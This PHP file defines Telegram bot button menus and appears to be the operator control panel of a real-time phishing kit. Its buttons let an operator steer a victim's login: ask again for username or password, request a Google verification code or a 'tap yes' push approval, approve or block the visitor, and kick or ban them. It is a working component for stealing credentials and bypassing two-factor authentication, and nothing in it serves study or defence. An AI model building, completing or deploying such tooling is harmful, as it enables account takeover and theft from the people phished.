<?php
function getButtons($type, $unique_id) {
    switch ($type) {
        case 'approve_block_captcha_ban':
            return array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '✅ Approve', 'callback_data' => $unique_id . ' approve_access'),
                        array('text' => '⛔️ Block', 'callback_data' => $unique_id . ' block_access'),
                    ),
                    array(
                        array('text' => '🤖 Ask to resolve captcha', 'callback_data' => $unique_id . ' captcha_check'),
                    ),
                    array(
                        array('text' => '🚫 Ban user', 'callback_data' => $unique_id . ' ban_user'),
                    ),
                ),
            );

        case 'waiting_response':
            return array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '🔃 Waiting for response...', 'callback_data' => $unique_id . ' loading'),
                    ),
                ),
            );

        case 'kick_ban':
            return array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '❕KICK USER❕', 'callback_data' => $unique_id . ' kick_user'),
                        array('text' => '❗BAN USER❗', 'callback_data' => $unique_id . ' ban_user'),
                    ),
                ),
            );

        case 'password':
            return array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '👤 Ask Username Again', 'callback_data' => $unique_id . ' ask_user'),
                    ),
                    array(
                        array('text' => '🔑 Ask Password Again', 'callback_data' => $unique_id . ' ask_pwd'),
                    ),
                    array(
                        array('text' => '📲 Ask G-Code', 'callback_data' => $unique_id . ' ask_otp'),
                    ),
                    array(
                        array('text' => '📲 Ask Tap Yes', 'callback_data' => $unique_id . ' ask_tap'),
                    ),
                    array(
                        array('text' => '✅ Finish', 'callback_data' => $unique_id . ' finish'),
                    ),
                    array(
                        array('text' => '❕KICK USER❕', 'callback_data' => $unique_id . ' kick_user'),
                        array('text' => '❗BAN USER❗', 'callback_data' => $unique_id . ' ban_user'),
                    ),
                ),
            );

        case 'gcode_again_options':
            return array(
                'inline_keyboard' => array(
                    array(
                        array('text' => '📲 Ask G-Code Again', 'callback_data' => $unique_id . ' ask_otp'),
                    ),
                    array(
                        array('text' => '📲 Ask Tap Yes', 'callback_data' => $unique_id . ' ask_tap'),
                    ),
                    array(
                        array('text' => '✅ Finish', 'callback_data' => $unique_id . ' finish'),
                    ),
                    array(
                        array('text' => '❕KICK USER❕', 'callback_data' => $unique_id . ' kick_user'),
                        array('text' => '❗BAN USER❗', 'callback_data' => $unique_id . ' ban_user'),
                    ),
                ),
            );

        default:
            return array('inline_keyboard' => array()); // Return empty structure if type is unknown
    }
}
?>